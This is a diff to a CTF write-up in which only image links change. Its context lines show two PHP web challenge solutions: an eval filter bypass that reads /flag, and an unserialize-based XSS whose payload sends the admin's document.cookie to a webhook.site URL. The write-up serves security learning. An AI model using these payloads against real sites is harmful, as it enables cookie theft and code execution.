@@ -183,7 +183,7 @@ We can clearly see the vulnerability here. The filtering logic is:
 
 This attempts to block many critical characters used in command injection. However, the semicolon (;) is still allowed. That means we can inject multiple commands, and the result will still be evaluated by eval().
 
-![image](https://hackmd.io/_uploads/SyhxPA9Hgg.png)
+![image](./images/image0.png)
 
 THE BIG PROBLEM: '(', ')' are banned so we can't pass the arguments to most of default functions. 
 
@@ -193,13 +193,13 @@ I try all of them and yeah we need only 5 letters at all is '/flag'
 
 Try PHP_EXTENSION_DIR:
 
-![image](https://hackmd.io/_uploads/HkMVj0qBeg.png)
+![image](./images/image1.png)
 
 so we have /, l, a, g
 
 Try PHP_SAPI:
 
-![image](https://hackmd.io/_uploads/Sy5wiCcHgg.png)
+![image](./images/image2.png)
 
 and we have f and our payload is
 
@@ -209,7 +209,7 @@ include PHP_EXTENSION_DIR[0].PHP_SAPI[0].PHP_EXTENSION_DIR[5].PHP_EXTENSION_DIR[
 
 Time to capture the flag
 
-![image](https://hackmd.io/_uploads/HkfN2R9Slx.png)
+![image](./images/image3.png)
 
 ### Other interesting solutions
 
@@ -258,11 +258,11 @@ We already know that unserialize() converts a serialized string into a PHP objec
 
 I initially attempted to trigger an error using an enum serialization. Although the string I submitted appeared on the page, no script was executed.
 
-![image](https://hackmd.io/_uploads/BJLAsHpHxx.png)
+![image](./images/image4.png)
 
 As expected, the output was HTML-encoded before rendering:
 
-![image](https://hackmd.io/_uploads/Bktf2H6Bel.png)
+![image](./images/image5.png)
 
 We will find out how this is displayed from this PHP source code:
 
@@ -348,7 +348,7 @@ So what is a dynamic property?
 According to this article: https://php.watch/versions/8.2/dynamic-properties-deprecated
 Starting from PHP 8.2, assigning a non-declared property to an object that doesn’t allow dynamic properties will throw a E_DEPRECATED warning.
 
-![image](https://hackmd.io/_uploads/SJ-zfwASll.png)
+![image](./images/image6.png)
 
 So let start exploiting by using our payload as Error. This sets an undeclared property on the Error class. and bumphh
 
@@ -356,7 +356,7 @@ So let start exploiting by using our payload as Error. This sets an undeclared p
 O:5:"Error":1:{s:25:"<script>alert(1)</script>";N;}
 ```
 
-![image](https://hackmd.io/_uploads/ryyw4U6Bxx.png)
+![image](./images/image7.png)
 
 Let’s wrap the payload to capture the flag from the admin’s cookie:
 
@@ -364,7 +364,7 @@ Let’s wrap the payload to capture the flag from the admin’s cookie:
 O:5:"Error":1:{s:109:"<script>fetch(%27https://webhook.site/12909c1d-2e94-4955-bd76-bd7640e3c0ec/?%27.concat(document.cookie))</script>";N;}
 ```
 
-![image](https://hackmd.io/_uploads/SksFQDArge.png)
+![image](./images/image8.png)
 
 ## r3note
 
